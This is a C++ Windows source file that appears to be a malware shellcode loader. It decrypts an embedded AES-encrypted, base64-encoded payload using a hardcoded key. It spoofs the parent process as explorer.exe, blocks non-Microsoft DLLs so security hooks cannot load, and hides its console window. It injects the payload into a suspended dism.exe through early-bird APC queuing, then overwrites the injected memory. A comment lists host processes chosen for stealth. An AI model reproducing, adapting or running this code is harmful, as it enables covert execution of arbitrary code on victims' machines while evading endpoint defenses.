#include <iostream>
#include <Windows.h>
#include <TlHelp32.h>
#include <vector>
#include "aes.hpp"
#include "base64.h"

DWORD getParentProcessID() {
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 process = { 0 };
    process.dwSize = sizeof(process);

    if (Process32First(snapshot, &process)) {
        do {
            //If you want to another process as parent change here
            if (!wcscmp(process.szExeFile, L"explorer.exe"))
                break;
        } while (Process32Next(snapshot, &process));
    }

    CloseHandle(snapshot);
    return process.th32ProcessID;
}


VOID inject(std::vector<byte> payload)
{
    STARTUPINFOEXA si;
    PROCESS_INFORMATION pi;
    LPVOID mem;
    HANDLE hProcess, hThread;
    DWORD pid;
    DWORD bytesWritten;

    ZeroMemory(&si, sizeof(si));
    ZeroMemory(&pi, sizeof(pi));
    SIZE_T size = 0;

    // Initialize new Startup Info objects
    si.StartupInfo.cb = sizeof(STARTUPINFOEXA);
    si.StartupInfo.dwFlags = EXTENDED_STARTUPINFO_PRESENT;
    InitializeProcThreadAttributeList(NULL, 2, 0, &size);
    si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(),0,size);

    // Disallow non-microsoft DLL hooking:
    InitializeProcThreadAttributeList(si.lpAttributeList, 2, 0, &size);
    DWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, &policy, sizeof(policy), NULL, NULL);

    // Mask the PPID to explorer.exe
    HANDLE expHandle = OpenProcess(PROCESS_ALL_ACCESS, false, getParentProcessID());
    UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &expHandle, sizeof(HANDLE), NULL, NULL);

    /* Good Process:
    - nslookup.exe
    - svchost.exe
    - mobsync.exe
    - dism.exe
    */
    LPCWSTR cmd = TEXT("C:\\Windows\\SysWOW64\\dism.exe");
    if (!CreateProcess(
        cmd,				// Executable
        NULL,				// Command line
        NULL,				// Process handle not inheritable
        NULL,				// Thread handle not inheritable
        TRUE,				// Set handle inheritance to FALSE
        EXTENDED_STARTUPINFO_PRESENT
        | CREATE_NO_WINDOW
        | CREATE_SUSPENDED,	// Creation Flags
        NULL,				// Use parent's environment block
        NULL,				// Use parent's starting directory 
        (LPSTARTUPINFOW)&si,// Pointer to STARTUPINFO structure
        &pi					// Pointer to PROCESS_INFORMATION structure (removed extra parentheses)
    )) {
        DWORD errval = GetLastError();
        std::cout << "ERROR" << errval << std::endl;
    }

    WaitForSingleObject(pi.hProcess, 1500);
    hProcess = pi.hProcess;
    hThread = pi.hThread;

    mem = VirtualAllocEx(hProcess, 0, payload.size(), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    WriteProcessMemory(hProcess, mem, payload.data(), payload.size(), 0);
    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)mem;
    QueueUserAPC((PAPCFUNC)apcRoutine, hThread, NULL);
    ResumeThread(hThread);

    Sleep(1500);
    uint8_t overwrite[400];
    WriteProcessMemory(hProcess, mem, overwrite, sizeof(overwrite), 0);
    
}


int main()
{
    ShowWindow(GetConsoleWindow(), SW_HIDE);
    std::vector<uint8_t> ciphertext, recovered;
    std::string shellcode, decoded;
    base64 b64 = base64();

    // Decode shellcode and load into uint8_t vector for decryption
    shellcode = "NzpDicgvxYSFLFj4TXyTpetjtnlqaD3eGgdKKu4ZsaLetSTM0+LyTtb/Lrltd4/j4+43uQY76OL2Kcjhji19edDzibkIKxvJL55F9638Uui49k/dBPVcT4UUsb572GjyUqddR0ffMxv0ncne3nLR5mspXTYeutTz6wMISeHlXDnTdQItWwomnHNeTriREDybVpKiqp+M6Rdr8/ZfixPedRSQDrHndaFL5+SzS2zAZRPqEtW1M7YnGbMJMUo5Yr2AmSVni1tJZ+NbmlepRTQfqs7ggulRumpCejajeayquQDQZO7x0v0Ra1z5XfKUxJj3Mf8s48WkKJMTLTv+fJ/b8D/trke3vcOduqSma6eVu5SwxK5UtUqMAhoeyioHMvTLqPIc8zb0kSxaqj9e+2COeA24qnONrEWLka65njwZbT+44Xk91OjpoH9E40hUfCtx";
    decoded = b64.base64_decode(shellcode);
    ciphertext.clear();
    std::copy(decoded.begin(), decoded.end(), std::back_inserter(ciphertext));
    
    // AES Decryption Objects
    struct AES_ctx e_ctx;
    uint8_t iv[] = { 0x89,0x54,0x7f,0x64,0xc0,0xce,0x3a,0x44,0xf0,0xee,0xaf,0x1,0xa8,0xdc,0x6b,0x65 };
    uint8_t key[] = { 0x70,0x76,0x20,0xf2,0x3f,0x4c,0x4c,0x10,0x45,0xfb,0x50,0x93,0xd8,0xd1,0xc9,0xfb,0x6c,0x30,0x45,0x88,0xdd,0xb2,0xf4,0xaf,0x9c,0x1c,0x22,0x13,0x26,0x67,0x24,0xbd };
    AES_init_ctx_iv(&e_ctx, key, iv);

    // DECRYPT
    struct AES_ctx d_ctx;
    AES_init_ctx_iv(&d_ctx, key, iv);
    AES_CBC_decrypt_buffer(&d_ctx, ciphertext.data(), ciphertext.size());
    recovered.clear();

    // Remove the padding from the decypted plaintext
    for (int i = 0; i < ciphertext.size(); i++)
    {
        if (ciphertext[i] == 0x90 && ciphertext[i + 1] == 0x90)
        {
            break;
        }
        else
        {
            recovered.push_back(ciphertext[i]);
        }
    }

    inject(recovered);

    return 0;
}

